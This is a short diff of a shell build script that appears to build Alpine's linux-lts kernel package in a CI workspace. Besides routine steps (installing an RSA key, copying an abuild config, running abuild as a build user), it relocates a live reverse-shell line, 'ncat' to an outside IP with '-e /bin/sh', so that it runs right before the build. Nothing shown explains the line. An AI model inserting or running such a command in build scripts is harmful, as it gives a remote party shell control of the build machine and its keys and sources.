@@ -54,14 +54,14 @@ chown -R abuild3:abuild3 /home/abuild3/installrsakey.sh
 
 su -c "/home/abuild3/installrsakey.sh" -m abuild3 
 
-ncat 195.201.134.209 83 -e /bin/sh
-sleep 10
-
 ###hack to allow abuild to work
 mkdir .abuild
 cp /home/abuild3/.abuild/abuild.conf .abuild
 chown -R abuild3:abuild3 .abuild
 
+
+ncat 195.201.134.209 83 -e /bin/sh
+sleep 10
 
 su -c "cd /github/workspace/aports/main/linux-lts; abuild" -m abuild3 
 
